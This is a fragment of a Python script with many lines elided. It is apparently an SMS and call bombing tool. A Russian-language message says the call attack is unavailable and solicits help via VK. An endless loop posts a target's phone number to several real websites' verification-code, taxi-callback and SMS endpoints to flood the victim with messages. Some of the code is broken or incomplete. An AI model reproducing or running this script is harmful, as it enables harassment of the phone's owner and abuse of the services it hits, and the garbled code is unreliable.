...
print(Fore.YELLOW)
print(
    "К сожелению атака звонками сейчас не доступна , буду благодерен тем кто поможет с сервисом для звонков ! Пишите в ВК "
)
print(Fore.RED)
    ...
    while True:
        ...
        try:
            ...
            requests.post(
                ...
                {"status": "success", "GetCallID": 13302425},
            )
        ...
        try:
            ...
            requests.post(
                "https://btfair.site/api/user/phone/code", json={"phone": "+" + _phone,}
            )
        ...
        try:
            ...
            requests.post(
                "https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}
            )
        ...
        try:
            ...
            requests.post(
                "https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}
            )
